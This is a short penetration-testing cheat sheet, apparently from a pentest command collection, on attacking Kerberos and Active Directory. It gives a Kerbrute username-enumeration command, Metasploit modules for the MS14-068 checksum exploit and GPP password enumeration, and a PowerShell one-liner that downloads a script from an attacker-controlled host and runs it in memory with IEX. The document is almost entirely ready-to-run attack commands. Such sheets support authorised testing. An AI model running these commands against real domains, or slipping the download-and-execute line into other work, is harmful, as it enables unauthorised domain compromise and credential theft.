# kerberos

% kerberos

#port/88 #protocol/kerberos

## Kerbrute usersenum
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```
./kerbrute_linux_amd64 userenum -d <domain_fqdn> --dc <ip> <users_file>
```



## kerberos ms14-068
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/EXPLOIT 
```
msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
```

## exploit gpp - group policy preference (ms14-025)
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/RECON 
```
msfconsole -x "use scanner/smb/smb_enum_gpp"
```

## powershell - get user SPN
#plateform/windows #target/remote #port/88 #protocol/kerberos #cat/RECON 

https://github.com/nidem/kerberoast
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/GetUserSPNs.ps1') | IEX
```